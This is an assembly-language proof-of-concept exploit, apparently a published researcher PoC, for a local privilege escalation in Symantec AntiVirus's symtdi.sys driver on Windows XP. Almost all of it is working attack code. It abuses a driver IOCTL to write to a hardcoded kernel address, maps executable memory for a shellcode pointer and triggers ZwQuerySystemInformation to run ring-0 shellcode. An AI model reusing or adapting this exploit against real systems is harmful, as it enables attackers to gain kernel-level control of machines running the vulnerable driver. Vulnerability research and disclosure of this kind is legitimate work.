;; Symantec AntiVirus symtdi.sys Local Privilege Escalation
;; -- 
;; Zohiartze Herce San Martin -=- http://www.48bits.com/


.386
.model flat,stdcall
option casemap:none

;####################################
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
includelib \masm32\lib\kernel32.lib
;####################################


.const

versionXP equ 1


.data

szSymbolicName              db "\\.\symTDI", 0
szNtdll2                    db "Ntdll.dll", 0
szZwQuerySystemInformation2 db "ZwQuerySystemInformation", 0


.data?

inBuffer                    dd 4   dup (?)
outBuffer                   dd 200 dup (?)
structura                   OVERLAPPED <>
fZwQuerySystemInformation   dd          ?
nBytesReturned              dd          ?
symLinkHandle               dd          ?
hardCodedVA                 dd          ?


.code
        

start:
int 3
        ;
        ; Obtain QuerySystemInformation address
        ;
        invoke GetModuleHandle, offset szNtdll2
        invoke GetProcAddress, eax, offset szZwQuerySystemInformation2
        mov fZwQuerySystemInformation, eax

        ;
        ; Obtain handle to symbolic link
        ;
        invoke CreateFile, offset szSymbolicName, 0, 0, 0, 3, 0, 0
        mov [symLinkHandle], eax

        ;
        ; Obtain data to be written. This way we will know in which VA we have to allocate memory for our shellcode
        ;
        invoke DeviceIoControl, eax, 83022323h, offset inBuffer, 10h, offset outBuffer, 4h, offset nBytesReturned, 0
        mov eax, [outBuffer]

        cmp al, 7fh
        ja ERROR
        
        xor ebx, ebx
        mov bl, al
        shl ebx, 24
        or ebx, 00570000h   ; Address in which we are traying to allocate mem for shellcode

        ;
        ; Allocate Memory for ring0 shellcode
        ;
        invoke VirtualAlloc, ebx, 0ffffh, MEM_RESERVE OR MEM_COMMIT, 40h
        
        cmp eax, 0
        jz ERROR
        
        mov dword ptr [eax + 0cb00h], offset shellcode

        ;
        ; Send IOCTL again, this time passing the kernel address as output buffer pointer
        ;
        mov eax, [symLinkHandle]
        invoke DeviceIoControl, eax, 83022323h, offset inBuffer, 10h, 8057c523h, 4h, offset nBytesReturned, 0

        push 0 
        push 0
        push 0
        push 0
        call fZwQuerySystemInformation

    ;---------------
    ERROR:
    ;---------------

	  xor eax, eax
	  invoke ExitProcess, eax

shellcode proc

int 3
    push ebx
    push eax
    mov ebx, 8057c523h
    mov eax, 2CFF8380h
    mov [ebx], eax       ; Return kernell patch to it's original opcodes

    pop eax
    pop ebx

    xor eax, eax         ; Return to original execution flow
    push 8057c516h
    ret


shellcode endp


end start

